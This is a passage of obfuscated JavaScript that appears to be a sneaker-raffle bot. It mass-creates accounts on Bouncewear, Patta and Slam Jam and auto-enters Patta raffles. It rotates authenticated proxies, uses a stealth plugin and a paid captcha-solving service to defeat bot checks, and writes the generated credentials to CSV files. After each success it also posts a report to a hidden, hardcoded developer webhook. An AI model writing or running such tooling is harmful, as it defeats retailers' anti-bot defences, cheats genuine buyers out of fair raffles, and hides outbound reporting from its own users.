            continue;
        }
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0x286e17 = _0x5ce3d6()[_0x1b9328]['split'](':');
        else
            var _0x17907b = Math['round'](Math['random']() * (_0x5ce3d6()['length'] - 0x1)), _0x286e17 = _0x5ce3d6()[_0x17907b]['split'](':');
        const _0x2b0179 = await _0x53a2e2['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x286e17[0x0] + ':' + _0x286e17[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x10cbd4 = await _0x2b0179['newPage']();
            await _0x10cbd4['authenticate']({
                'username': '' + _0x286e17[0x2],
                'password': '' + _0x286e17[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x2e4806['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x10cbd4['setRequestInterception'](!![]), _0x10cbd4['on']('request', _0xb0611d => {
                _0xb0611d['resourceType']() === 'image' || _0xb0611d['resourceType']() === 'font' || _0xb0611d['resourceType']() === 'media' ? _0xb0611d['abort']() : _0xb0611d['continue']();
            }), await _0x10cbd4['goto'](_0x738207), await _0x30926a(0xbb8), await _0x10cbd4['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x31f3f5() + '\x20[' + _0x2e4806['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20Filling\x20information'), await _0x10cbd4['type']('#RegisterForm-FirstName', '' + bouncewear[_0x1b9328]['FirstName']), await _0x30926a(0x226), await _0x10cbd4['type']('#RegisterForm-LastName', '' + bouncewear[_0x1b9328]['LastName']), await _0x30926a(0x226), await _0x10cbd4['type']('#RegisterForm-email', '' + bouncewear[_0x1b9328]['Email']), await _0x30926a(0x226), await _0x10cbd4['type']('#RegisterForm-password', '' + bouncewear[_0x1b9328]['Password']), await _0x30926a(0x226), await _0x10cbd4['click']('#marketing'), console['log'](_0x31f3f5() + '\x20[' + _0x2e4806['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20Submitting..'), await _0x10cbd4['$eval']('#RegisterForm', _0x4cf9ff => _0x4cf9ff['submit']()), await _0x30926a(0x1f40), console['log'](_0x31f3f5() + '\x20[' + _0x2e4806['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x10cbd4['solveRecaptchas'](), await _0x10cbd4['click']('.shopify-challenge__button.btn');
            async function _0x49c48b() {
                for (var _0x4cf1b4 = 0x0; _0x4cf1b4 < 0x4; _0x4cf1b4++) {
                    try {
                        console['log']('try'), await _0x10cbd4['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x31f3f5() + '\x20[' + _0x2e4806['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20' + _0x471d3f['red']('Catpcha\x20failed,\x20retrying..')), await _0x10cbd4['solveRecaptchas'](), await _0x10cbd4['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x49c48b(), console['log'](_0x31f3f5() + '\x20[' + _0x2e4806['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x30926a(0x1f4);
            try {
                await _0x10cbd4['waitForSelector']('.featured-title'), await _0x30926a(0x1f4), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x2e4806['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x1b9328]['Email'] + '\x20Generated!')), _0x1c44db['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x1b9328]['Email'] + ',' + bouncewear[_0x1b9328]['Password']), console['log'](_0x471d3f['yellow'](_0x31f3f5() + '\x20[' + _0x2e4806['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x1b9328]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x5df519) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x5df519));
            }
        } catch (_0x3bc305) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x1b9328 + 0x1) + '\x20:\x20' + _0x3bc305));
        } finally {
            _0x2b0179 && _0x2b0179['close'](), console['log']('Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x1f648c(_0x2ddbd7, _0x510f09, _0x3a4221, _0x3b58f2) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1cab31 = 0x0; _0x1cab31 < _0x3a4221['length']; _0x1cab31++) {
        var _0x4c7e0f = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3566aa
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x1ca3b9['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x531a7c
                }
            ]
        }];
        const _0x55597d = { 'embeds': _0x4c7e0f };
        _0x359416(_0x510f09['name'] + '\x20Task\x20' + (_0x1cab31 + 0x1) + '\x20/\x20' + _0x3a4221['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847), await _0x44956d(_0x3a4221, _0x1cab31);
        var _0x26ea4b = await _0x51c110(_0x3a4221[_0x1cab31], _0x510f09, 'acc', ![]);
        const _0x5709dc = { 'succesDEVMSG': { 'embeds': [_0x26ea4b] } };
        if (_0x3a4221[_0x1cab31]['Email'] == '' || _0x3a4221[_0x1cab31]['FirstName'] == '' || _0x3a4221[_0x1cab31]['LastName'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x1cab31 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x30926a(0x7d0);
            continue;
        }
        (_0x3a4221[_0x1cab31]['Password'] == '' || _0x3a4221[_0x1cab31] == undefined) && _0x3a4221[_0x1cab31]['Password'] == 'JRaffles23!';
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0x7dc784 = _0x3b58f2[_0x1cab31]['split'](':');
        else
            var _0x57454b = Math['round'](Math['random']() * (_0x3b58f2['length'] - 0x1)), _0x7dc784 = _0x3b58f2[_0x57454b]['split'](':');
        const _0x40f902 = await _0x53a2e2['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x7dc784[0x0] + ':' + _0x7dc784[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x575a06 = await _0x40f902['newPage']();
            await _0x575a06['authenticate']({
                'username': '' + _0x7dc784[0x2],
                'password': '' + _0x7dc784[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x510f09['name'] + ']\x20Task\x20' + (_0x1cab31 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x575a06['setRequestInterception'](!![]), _0x575a06['on']('request', _0x44ee2a => {
                _0x44ee2a['resourceType']() === 'image' || _0x44ee2a['resourceType']() === 'font' || _0x44ee2a['resourceType']() === 'media' ? _0x44ee2a['abort']() : _0x44ee2a['continue']();
            }), await _0x575a06['goto'](_0x2ddbd7), await _0x30926a(0xbb8), await _0x575a06['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x31f3f5() + '\x20[' + _0x510f09['name'] + ']\x20Task\x20' + (_0x1cab31 + 0x1) + '\x20:\x20Filling\x20information'), await _0x575a06['type']('#RegisterForm-FirstName', '' + _0x3a4221[_0x1cab31]['FirstName']), await _0x30926a(0x226), await _0x575a06['type']('#RegisterForm-LastName', '' + _0x3a4221[_0x1cab31]['LastName']), await _0x30926a(0x226), await _0x575a06['type']('#RegisterForm-email', '' + _0x3a4221[_0x1cab31]['Email']), await _0x30926a(0x226), await _0x575a06['type']('#RegisterForm-password', '' + _0x3a4221[_0x1cab31]['Password']), await _0x30926a(0x226), console['log'](_0x31f3f5() + '\x20[' + _0x510f09['name'] + ']\x20Task\x20' + (_0x1cab31 + 0x1) + '\x20:\x20Submitting..'), await _0x575a06['$eval']('#RegisterForm', _0x2320bb => _0x2320bb['submit']()), await _0x30926a(0x1f40);
            try {
                await _0x575a06['waitForSelector']('.home-page-grid__collection'), await _0x30926a(0x1f4), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x510f09['name'] + ']\x20Task\x20' + (_0x1cab31 + 0x1) + '\x20:\x20Account\x20' + _0x3a4221[_0x1cab31]['Email'] + '\x20Generated!')), _0x1c44db['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x3a4221[_0x1cab31]['Email'] + ',' + _0x3a4221[_0x1cab31]['Password']), console['log'](_0x471d3f['yellow'](_0x31f3f5() + '\x20[' + _0x510f09['name'] + ']\x20Task\x20' + (_0x1cab31 + 0x1) + '\x20:\x20Account\x20' + _0x3a4221[_0x1cab31]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x5709dc['succesDEVMSG']);
                } catch {
                }
                await _0x5778ae(_0x5cef85, _0x5709dc['succesDEVMSG']);
            } catch (_0x41c19d) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x1cab31 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x41c19d));
            }
        } catch (_0x260a35) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x1cab31 + 0x1) + '\x20:\x20' + _0x260a35));
        } finally {
            _0x40f902 && _0x40f902['close'](), console['log']('Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x5a9e33(_0x40371d, _0xfa0940, _0x1f6928, _0x1ad265) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x21cb9c = 0x0; _0x21cb9c < _0x1f6928['length']; _0x21cb9c++) {
        var _0x4a3ef6;
        if (_0x34de34 != 'yes')
            var _0x34de34 = '', _0x5bef3b = 0x0;
        _0x359416(_0xfa0940['name'] + '\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20/\x20' + _0x1f6928['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847), await _0x44956d(_0x1f6928, _0x21cb9c);
        if (_0x1f6928[_0x21cb9c]['Email'] == '' || _0x1f6928[_0x21cb9c]['Password'] == '' || _0x1f6928[_0x21cb9c]['FirstName'] == '' || _0x1f6928[_0x21cb9c]['LastName'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0x2cc10b = _0x1ad265[_0x21cb9c]['split'](':');
        else
            var _0x3c95f7 = Math['round'](Math['random']() * (_0x1ad265['length'] - 0x1)), _0x2cc10b = _0x1ad265[_0x3c95f7]['split'](':');
        const _0x504976 = await _0x53a2e2['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2cc10b[0x0] + ':' + _0x2cc10b[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2319f0 = await _0x504976['newPage']();
            await _0x2319f0['authenticate']({
                'username': '' + _0x2cc10b[0x2],
                'password': '' + _0x2cc10b[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0xfa0940['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2319f0['setRequestInterception'](!![]), _0x2319f0['on']('request', _0x5845fe => {
                _0x5845fe['resourceType']() === 'image' || _0x5845fe['resourceType']() === 'font' || _0x5845fe['resourceType']() === 'media' ? _0x5845fe['abort']() : _0x5845fe['continue']();
            }), await _0x2319f0['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x2319f0['waitForSelector']('#CustomerEmail'), console['log'](_0x31f3f5() + '\x20[' + _0xfa0940['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2319f0['type']('#CustomerEmail', '' + _0x1f6928[_0x21cb9c]['Email']), await _0x30926a(0x12c), await _0x2319f0['type']('#CustomerPassword', '' + _0x1f6928[_0x21cb9c]['Password']), await _0x30926a(0x226), await _0x2319f0['$eval']('#customer_login', _0x1cb5eb => _0x1cb5eb['submit']());
            try {
                await _0x2319f0['waitForSelector']('#orders'), await _0x30926a(0x4b0);
            } catch {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0xfa0940['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x2319f0['goto']('' + _0x1f6928[_0x21cb9c]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x30926a(0xbb8), console['log'](_0x31f3f5() + '\x20[' + _0xfa0940['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x2319f0['waitForSelector']('#email');
            } catch {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0xfa0940['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x2319f0['type']('#email', '' + _0x1f6928[_0x21cb9c]['Email']), await _0x30926a(0x384), await _0x2319f0['type']('#first_name', '' + _0x1f6928[_0x21cb9c]['FirstName']), await _0x30926a(0x514), await _0x2319f0['type']('#last_name', '' + _0x1f6928[_0x21cb9c]['LastName']), await _0x30926a(0x514), await _0x2319f0['type']('#street_address', _0x1f6928[_0x21cb9c]['Address1'] + '\x20' + _0x1f6928[_0x21cb9c]['HouseNumber'] + '\x20' + _0x1f6928[_0x21cb9c]['Address2']), await _0x30926a(0x2bc);
            _0x1f6928[_0x21cb9c]['Postcode'] == undefined && (_0x1f6928[_0x21cb9c]['Postcode'] = _0x1f6928[_0x21cb9c]['Zip']);
            await _0x2319f0['type']('#zip_code', '' + _0x1f6928[_0x21cb9c]['Postcode']), await _0x30926a(0x320), await _0x2319f0['type']('#city', '' + _0x1f6928[_0x21cb9c]['City']), await _0x30926a(0x320), await _0x2319f0['type']('#bday', '01/01/1994'), await _0x30926a(0x320), await _0x2319f0['type']('#instagram', '' + _0x1f6928[_0x21cb9c]['Follower']), await _0x30926a(0x352);
            if (_0x1f6928[_0x21cb9c]['Size'] == 'RANDOM') {
                const _0xbd697d = await _0x2319f0['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0xd1a549 => {
                    return _0xd1a549['map'](_0x57bca2 => _0x57bca2['textContent']);
                });
                var _0x4c0333 = Math['round'](Math['random']() * (_0xbd697d['length'] - 0x1));
                console['log'](_0x31f3f5() + '\x20[' + _0xfa0940['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0xbd697d[_0x4c0333]), await _0x2319f0['click']('label[data-eu-size=\x22' + _0xbd697d[_0x4c0333] + '\x22]');
            } else {
                console['log'](_0x31f3f5() + '\x20[' + _0xfa0940['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x1f6928[_0x21cb9c]['Size']);
                try {
                    await _0x2319f0['click']('label[data-eu-size=\x22' + _0x1f6928[_0x21cb9c]['Size'] + '\x22]');
                } catch {
                    await _0x2319f0['click']('label[data-eu-size=\x22' + _0x1f6928[_0x21cb9c]['Size'] + '.0\x22]');
                }
            }
            await _0x30926a(0xbb8), await _0x2319f0['$$eval']('.raffle__checkbox-label', _0x8108f9 => _0x8108f9['forEach'](_0x18cc5e => _0x18cc5e['click']())), await _0x30926a(0x7d0), console['log'](_0x31f3f5() + '\x20[' + _0xfa0940['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x2319f0['click']('#raffle__form-submit'), await _0x30926a(0x1388);
            try {
                await _0x2319f0['waitForSelector']('#raffle__confirmation-message-container'), _0x34de34 = 'no', _0x2989d8(_0x1f6928[_0x21cb9c], _0xfa0940), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0xfa0940['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x45486b) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x45486b));
            }
        } catch (_0xc847cf) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20' + _0xc847cf)), _0x34de34 = 'yes';
        } finally {
            _0x504976 && _0x504976['close']();
            if (_0x34de34 == 'yes' && _0x5bef3b != 0x5 && _0x4a3ef6 != 'Size\x20Not\x20Found') {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0xfa0940['name'] + ']\x20Task\x20' + (_0x21cb9c + 0x1) + '\x20:\x20Retrying')), _0x21cb9c = _0x21cb9c - 0x1, _0x5bef3b = _0x5bef3b + 0x1;
                continue;
            }
            _0x34de34 == 'yes' && _0x5bef3b >= 0x5 && (_0x3c82b6(_0x1f6928[_0x21cb9c], _0xfa0940), _0x34de34 = 'no', _0x5bef3b = 0x0), console['log']('Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x3bf321(_0x5c586a, _0x124673, _0x258155, _0x5b7a8c) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2fa152 = 0x0; _0x2fa152 < _0x258155['length']; _0x2fa152++) {
        if (_0x11a9fb != 'yes')
            var _0x11a9fb = '', _0x16606f = 0x0;
        var _0xf2eeba = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3566aa
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x1ca3b9['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x531a7c
                }
            ]
        }];
        const _0x22a326 = { 'embeds': _0xf2eeba };
        _0x359416(_0x124673['name'] + '\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20/\x20' + _0x258155['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847), await _0x44956d(_0x258155, _0x2fa152);
        var _0x3862b9 = await _0x51c110(_0x258155[_0x2fa152], _0x124673, 'acc', ![]);
        const _0x342d17 = { 'succesDEVMSG': { 'embeds': [_0x3862b9] } };
        if (_0x258155[_0x2fa152]['Email'] == '' || _0x258155[_0x2fa152]['FirstName'] == '' || _0x258155[_0x2fa152]['LastName'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x30926a(0x7d0);
            continue;
        }
        (_0x258155[_0x2fa152]['Password'] == '' || _0x258155[_0x2fa152] == undefined) && _0x258155[_0x2fa152]['Password'] == 'JRaffles23!';
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0x505eac = _0x5b7a8c[_0x2fa152]['split'](':');
        else
            var _0x4eb08e = Math['round'](Math['random']() * (_0x5b7a8c['length'] - 0x1)), _0x505eac = _0x5b7a8c[_0x4eb08e]['split'](':');
        const _0x3f35ed = await _0x53a2e2['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x505eac[0x0] + ':' + _0x505eac[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x344ceb = await _0x3f35ed['newPage']();
            await _0x344ceb['authenticate']({
                'username': '' + _0x505eac[0x2],
                'password': '' + _0x505eac[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x124673['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x344ceb['setRequestInterception'](!![]), _0x344ceb['on']('request', _0x17ab19 => {
                _0x17ab19['resourceType']() === 'image' || _0x17ab19['resourceType']() === 'font' || _0x17ab19['resourceType']() === 'media' ? _0x17ab19['abort']() : _0x17ab19['continue']();
            }), await _0x344ceb['goto']('https://drop.slamjam.com/account/register'), await _0x30926a(0xbb8), await _0x344ceb['waitForSelector']('#FirstName'), await _0x344ceb['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x344ceb['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x31f3f5() + '\x20[' + _0x124673['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20Filling\x20information'), await _0x30926a(0x4b0), await _0x344ceb['type']('#FirstName', '' + _0x258155[_0x2fa152]['FirstName']), await _0x30926a(0x226), await _0x344ceb['type']('#LastName', '' + _0x258155[_0x2fa152]['LastName']), await _0x30926a(0x226), await _0x344ceb['type']('#Email', '' + _0x258155[_0x2fa152]['Email']), await _0x30926a(0x2ee), await _0x344ceb['type']('#ConfirmEmail', '' + _0x258155[_0x2fa152]['Email']), await _0x30926a(0x2ee), await _0x344ceb['type']('#CreatePassword', '' + _0x258155[_0x2fa152]['Password']), await _0x30926a(0x2ee), await _0x344ceb['type']('#CreateConfirmPassword', '' + _0x258155[_0x2fa152]['Password']), await _0x30926a(0x226), console['log'](_0x31f3f5() + '\x20[' + _0x124673['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20Submitting..'), await _0x344ceb['$eval']('#create_customer', _0x50354d => _0x50354d['submit']()), await _0x30926a(0x1388), console['log'](_0x31f3f5() + '\x20[' + _0x124673['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20' + _0x471d3f['cyan']('Solving\x20Captcha')), await _0x344ceb['solveRecaptchas'](), console['log'](_0x31f3f5() + '\x20[' + _0x124673['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x344ceb['$eval']('.shopify-challenge__container\x20>\x20form', _0xe4bea0 => _0xe4bea0['submit']());
            try {
                await _0x344ceb['waitForSelector']('.product-card__image'), await _0x30926a(0x1f4), _0x11a9fb = 'no', console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x124673['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20Account\x20' + _0x258155[_0x2fa152]['Email'] + '\x20Generated!')), _0x1c44db['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x258155[_0x2fa152]['Email'] + ',' + _0x258155[_0x2fa152]['Password']), console['log'](_0x471d3f['yellow'](_0x31f3f5() + '\x20[' + _0x124673['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20Account\x20' + _0x258155[_0x2fa152]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x342d17['succesDEVMSG']);
                } catch {
                }
                await _0x5778ae(_0x5cef85, _0x342d17['succesDEVMSG']);
            } catch (_0x1c81f2) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1c81f2));
            }
        } catch (_0x23baf2) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20' + _0x23baf2));
        } finally {
            _0x3f35ed && _0x3f35ed['close']();
            if (_0x11a9fb == 'yes' && _0x16606f != 0x5) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x124673['name'] + ']\x20Task\x20' + (_0x2fa152 + 0x1) + '\x20:\x20Retrying')), _0x2fa152 = _0x2fa152 - 0x1, _0x16606f = _0x16606f + 0x1;
                continue;
            }
            _0x11a9fb == 'yes' && _0x16606f >= 0x5 && (_0x3c82b6(_0x258155[_0x2fa152], _0x124673), _0x11a9fb = 'no', _0x16606f = 0x0), console['log']('Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x2c857c(_0x3e0520, _0x568995, _0x5c42fe, _0xdaa8bc) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x36ee02 = 0x0; _0x36ee02 < _0x5c42fe['length']; _0x36ee02++) {
        var _0x2646a3;
        if (_0xd29e04 != 'yes')
            var _0xd29e04 = '', _0x3b09dd = 0x0;
        _0x359416(_0x568995['name'] + '\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20/\x20' + _0x5c42fe['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847), await _0x44956d(_0x5c42fe, _0x36ee02);
        if (_0x5c42fe[_0x36ee02]['Email'] == '' || _0x5c42fe[_0x36ee02]['Password'] == '' || _0x5c42fe[_0x36ee02]['FirstName'] == '' || _0x5c42fe[_0x36ee02]['LastName'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0x1da15f = _0xdaa8bc[_0x36ee02]['split'](':');
        else
            var _0x3be037 = Math['round'](Math['random']() * (_0xdaa8bc['length'] - 0x1)), _0x1da15f = _0xdaa8bc[_0x3be037]['split'](':');
        const _0x507692 = await _0x53a2e2['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1da15f[0x0] + ':' + _0x1da15f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x3d0343 = await _0x507692['newPage']();
            await _0x3d0343['authenticate']({
                'username': '' + _0x1da15f[0x2],
                'password': '' + _0x1da15f[0x3]
            }), await _0x3d0343['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3d0343['setRequestInterception'](!![]), _0x3d0343['on']('request', _0x33d7aa => {
                _0x33d7aa['resourceType']() === 'image' || _0x33d7aa['resourceType']() === 'font' || _0x33d7aa['resourceType']() === 'media' ? _0x33d7aa['abort']() : _0x33d7aa['continue']();
            }), await _0x3d0343['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x3d0343['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3d0343['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x30926a(0x258), await _0x3d0343['waitForSelector']('#CustomerEmail'), console['log'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x3d0343['type']('#CustomerEmail', '' + _0x5c42fe[_0x36ee02]['Email']), await _0x30926a(0x12c), await _0x3d0343['type']('#CustomerPassword', '' + _0x5c42fe[_0x36ee02]['Password']), await _0x30926a(0x226), await _0x3d0343['$eval']('#customer_login', _0x5c0080 => _0x5c0080['submit']()), await _0x30926a(0x7d0), await _0x3d0343['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20' + _0x471d3f['cyan']('Solving\x20Captcha')), await _0x3d0343['solveRecaptchas'](), console['log'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x3d0343['$eval']('.shopify-challenge__container\x20>\x20form', _0x107fd3 => _0x107fd3['submit']());
            try {
